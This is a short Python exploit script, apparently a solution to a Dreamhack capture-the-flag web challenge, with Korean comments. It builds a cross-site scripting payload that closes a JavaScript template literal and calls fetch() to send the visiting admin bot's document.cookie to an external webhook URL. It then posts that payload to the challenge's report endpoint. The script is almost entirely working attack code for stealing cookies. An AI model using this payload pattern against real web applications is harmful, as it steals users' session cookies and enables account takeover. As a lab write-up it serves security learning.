import requests

def solve_ctf():
    print("[*] ==== 익스플로잇 시작 ====")
    TARGET_URL = "http://host8.dreamhack.games:10025/report"
    WEBHOOK_URL = "https://webhooksite.net/5c337e9e-4316-4545-983b-ab895c23b065"
    
    print(f"[-] 타겟 서버: {TARGET_URL}")
    print(f"[-] 데이터 수신 웹훅: {WEBHOOK_URL}")

    print("\n[*] 페이로드 생성 중...")
    # 백틱을 닫고 fetch를 이용해 쿠키 정보를 웹훅 URL로 전송
    payload = f"`; fetch('{WEBHOOK_URL}/?flag=' + document.cookie); //"
    print(f"[-] 완성된 페이로드: {payload}")

    data = {
        "text": payload
    }
    
    try:
        print("\n[*] 타겟 서버로 POST 요청 전송...")
        print(f"[-] 전송 폼 데이터: {data}")
        
        response = requests.post(TARGET_URL, data=data)
        
        print(f"\n[-] HTTP 상태 코드: {response.status_code}")
        print(f"[-] 응답 헤더 내용: {dict(response.headers)}")
        
        # 응답 텍스트에 봇의 성공적인 방문이 기록되었는지 확인
        if "Success" in response.text:
            print("\n[+] 관리자(봇)가 성공적으로 페이지에 접근했습니다!")
            print("[+] 지금 바로 웹훅 사이트를 확인하여 URL 파라미터로 넘어온 플래그(cookie) 값을 확인하세요.")
        else:
            print("\n[-] 관리자 봇 방문 처리 실패. 서버 응답을 확인하세요.")
            print(f"[-] 응답 본문 일부: {response.text[:300]}")
            
    except Exception as e:
        print(f"\n[!] 요청 중 에러 발생: {e}")

if __name__ == "__main__":
    solve_ctf()